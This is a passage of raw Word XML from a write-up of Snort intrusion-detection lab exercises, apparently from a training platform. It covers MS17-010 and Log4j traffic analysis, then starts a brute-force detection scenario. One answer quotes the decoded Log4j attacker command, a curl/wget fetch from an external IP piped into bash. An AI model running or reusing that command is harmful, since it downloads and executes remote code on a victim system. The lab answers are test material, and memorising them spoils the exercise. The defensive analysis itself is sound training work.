    <w:p w14:paraId="1C3CE6A7" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Investigate the log files using "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r snort.log.1740013721 -X" What is the requested path?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67694EBC" w14:textId="51B804DA" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidR="00DF644C" w:rsidRPr="00E67FF4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>\\192.168.116.138\IPC$</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="627423A6" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3690E94E" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the CVSS v2 score of the MS17-010 vulnerability?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70531E2A" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 9.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB92060" w14:textId="20228052" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- Found with </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidR="00DF644C" w:rsidRPr="00E67FF4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.tenable.com/plugins/nessus/97737</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1BEB1A" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16171153" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 8: Using External Rules (Log4j)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E005E91" w14:textId="7365A326" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F38AA1B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the directory to Task 8. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> command with "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r log4j.pcap -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE2A7F2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4151DC76" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8363EB" w14:textId="087F92DA" w:rsidR="00261C8C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21316A2C" wp14:editId="2ADBAA72">
            <wp:extent cx="3931920" cy="899160"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2023969630" name="Picture 44"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9630" name="Picture 44" descr="A black rectangular object with white tex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1920" cy="899160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B71818D" w14:textId="2703FE16" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">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3.10: The number of detected packets for Task 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3FBE3A" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B438931" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44A328A1" w14:textId="57CCEA40" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Check the Event section under Limits.</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>How many rules were triggered?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425A7D75" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0EEAC1" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21E801F0" w14:textId="18F304E1" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Check the filtered events section. What are the first six digits of the triggered rule </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sids</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9F0A0F" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 210037</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3517CEE7" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15ED3869" w14:textId="78F8FE41" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Use local-1.rules empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**. Run the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file with the local-1.rules command.</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4899E24B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 41</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2096DC4D" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="437EECCA" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Investigate the log/alarm files. What is the name of the used encoding algorithm?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774EE1E3" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- Base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283CBFDF" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- Hidden in the HEX test of the log file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276BA2DC" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D9991F9" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the IP ID of the corresponding packet?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4781CDA1" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 62808</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F257A6" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="061965EE" w14:textId="12E6B681" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Decode the encoded command. Use a decoder website like:</w:t>
      </w:r>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:r w:rsidR="00DF644C" w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.base64decode.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00DF644C">
        <w:t xml:space="preserve">. What </w:t>
      </w:r>
      <w:r>
        <w:t>is the attacker's command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17682126" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- (curl -s 45.155.205.233:5874/162.0.228.253:80||</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -q -O- 45.155.205.233:5874/162.0.228.253:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>80)|</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEB1835" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10CC5F70" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What is the CVSS v2 score of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>the Log4j</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> vulnerability?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B75FABF" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 9.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4821278F" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CF44E11" w14:textId="025BE8CD" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Snort Challenge – Live Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC8663E" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EC3FDA4" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE657EB" w14:textId="3CD02B9F" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32C795F5" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In "Snort Challenge - Live Attacks", the user will investigate a series of traffic data and stop malicious activity under two different scenarios.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD0ABB3" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3957C7BF" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 2: Scenario 1 | Brute-Force</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7796BC6E" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CC7C431" w14:textId="0A84516D" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Start the VM and change the directory to /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/snort/rules. Use the "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>devX</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>" to get as much information as possible. There should be a packet that came through port 22 with SSH information.</w:t>
      </w:r>
      <w:r w:rsidR="00B74A7E">
        <w:t xml:space="preserve"> We will now create a rule with this IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096992E6" w14:textId="0913FA7C" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpi">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6D2700D1" wp14:editId="5032DD2B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>881880</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>248835</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="183240" cy="183240"/>
                <wp:effectExtent l="38100" t="38100" r="45720" b="45720"/>
                <wp:wrapNone/>
                <wp:docPr id="2142228584" name="Ink 51"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingInk">
                    <w14:contentPart bwMode="auto" r:id="rId34">
                      <w14:nvContentPartPr>
                        <w14:cNvContentPartPr/>
                      </w14:nvContentPartPr>
                      <w14:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="183240" cy="183240"/>
                      </w14:xfrm>
                    </w14:contentPart>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="5209BE24" id="Ink 51" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:68.95pt;margin-top:19.1pt;width:15.45pt;height:15.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&#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">
                <v:imagedata r:id="rId35" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CE0A0F7" wp14:editId="108BFCAC">
            <wp:extent cx="5478780" cy="594360"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="71972362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594360"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4774C3" w14:textId="1235DD15" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="cente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4.1: The traffic source and destination IPs with port numbers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E4D11D" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AD60D54" w14:textId="35D75E89" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Now, we will run the rule using "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A full"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CA12B9" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DEBFE1C" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F45F346" wp14:editId="6572CC1C">
            <wp:extent cx="3573780" cy="1447800"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="105946420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3780" cy="1447800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1796F836" w14:textId="7079968D" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
